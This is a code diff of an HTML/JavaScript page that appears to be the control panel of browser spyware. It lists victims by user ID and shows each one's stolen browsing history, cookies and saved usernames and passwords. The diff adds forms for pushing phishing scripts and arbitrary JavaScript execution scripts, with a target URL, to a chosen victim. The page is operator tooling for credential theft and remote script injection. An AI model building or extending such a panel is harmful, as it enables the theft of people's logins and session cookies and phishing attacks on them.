@@ -10,6 +10,7 @@
   	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
   	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
   	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+  	<link href="style.css" rel="stylesheet">
   </head>
 
   
@@ -80,6 +81,9 @@
 						var collapse = card.children[1];
 						collapse.id = "collapse" + userCount;
 
+						console.log(link.href);
+						console.log(collapse.id);
+
 						var body = collapse.children[0];
 						body.id = "body" + id;
 						body.innerHTML = "";
@@ -93,6 +97,7 @@
 
 
 				<script>
+					//Testing makeCard
 					var rand1 = Math.floor((Math.random() * 10000) + 1);
 					rand1 = rand1.toString();
 					var rand2 = Math.floor((Math.random() * 10000) + 1);
@@ -103,7 +108,7 @@
 					var idArray = [rand1, rand2, rand3];
 
 					for (var i = 0; i < idArray.length; i++) {
-						makeCard(idArray[i], "Online");
+						makeCard(idArray[i], "Offline");
 					}
 				</script>
 		
@@ -159,13 +164,13 @@
 
 
 				</script>
-				<button type="button" class="btn btn-outline-secondary btn-lg" onclick="fillHistory('0', historyArray)">Test fillHistory</button>
-				<button type="button" class="btn btn-outline-secondary btn-lg" onclick="fillCookies('0', nameArray, domainArray, valueArray)">Test fillCookies</button>
-				<button type="button" class="btn btn-outline-secondary btn-lg" onclick="fillLogins('0', urlArray, usernameArray, passwordArray)">Test fillLogins</button>
+				<button type="button" class="btn btn-outline-secondary btn-lg" onclick="fillHistory(rand1, historyArray)">Test fillHistory</button>
+				<button type="button" class="btn btn-outline-secondary btn-lg" onclick="fillCookies(rand2, nameArray, domainArray, valueArray)">Test fillCookies</button>
+				<button type="button" class="btn btn-outline-secondary btn-lg" onclick="fillLogins(rand3, urlArray, usernameArray, passwordArray)">Test fillLogins</button>
 
 				<script>
-					function fillHistory(index, historyArray){
-						index = "body" + index;
+					function fillHistory(id, historyArray){
+						id = "body" + id;
 						//body of cards have id "body0", "body1", "body2", ...
 
 						var table = document.createElement("table");
@@ -188,8 +193,8 @@
 				</script>
 
 				<script>
-					function fillCookies(index, nameArray, domainArray, valueArray){
-						index = "body" + index;
+					function fillCookies(id, nameArray, domainArray, valueArray){
+						id = "body" + id;
 						//body of cards have id "body0", "body1", "body2", ...
 
 						var table = document.createElement("table");
@@ -236,8 +241,8 @@
 
 
 				<script>
-					function fillLogins(index, urlArray, usernameArray, passwordArray){
-						index = "body" + index;
+					function fillLogins(id, urlArray, usernameArray, passwordArray){
+						id = "body" + id;
 						//body of cards have id "body0", "body1", "body2", ...
 
 						var bigRow = document.createElement("tr");
@@ -283,11 +288,41 @@
 
 	</div>	
 
-	<br><br>
+	<br><hr class="body"><br>
 
 	<div class = "ml-3">
 
 
+
+	<!-- Phishing and JSexe -->
+
+	<!-- Add Phishing -->
+    <form name="phishingForm" onsubmit "return phish()">
+        <h4>Add phishing script:</h4>
+        <br>
+        <input type = "text" name = "Phishing_ID" placeholder = "User ID"><br>
+        <input type = "text" name = "Phishing_Script" placeholder = "Script"><br>
+        <input type = "text" name = "Phishing_URL" placeholder = "URL"><br>
+        <input type = "submit" name = "Submit_Phishing_Script" class="btn btn-primary">
+    </form>
+
+    <br>
+
+    <!-- Add Javascript -->
+    <form name="jsForm" onsubmit "return js()">
+        <h4>Add javascript execution script:</h4>
+        <br>
+        <input type = "text" name = "JS_ID" placeholder = "User ID"><br>
+        <input type = "text" name = "JS_Script" placeholder = "Script"><br>
+        <input type = "text" name = "JS_URL" placeholder = "URL"><br>
+        <input type = "submit" name = "Submit_JS_Script" class="btn btn-primary">
+    </form>
+
+
+    <br><hr class="body"><br>
+
+
+	<!-- Black List Sites -->
 	<div id = "blackListSection">
 	<h4>Add Site to Blacklist Here</h4>
 	<input type="text" class="form-control blacklist" placeholder="URL">
@@ -311,11 +346,10 @@
 		window.addEventListener("hashchange", function() { scrollBy(0, -70) });
 	</script>
 
-	<script>
-		function idClick(count){		
-			localStorage.setItem("id", document.getElementById(count).innerHTML);
-		}
-	</script>
+
+
+
+
 
 	<script>
 		var jsonPackage = {type: statusRequest};
@@ -342,6 +376,11 @@
 	</div>
 	</div>
 	</div>
+
+
+	<br><br><br><br><br><br><br><br>
+
+
   </body>
 
 </html>
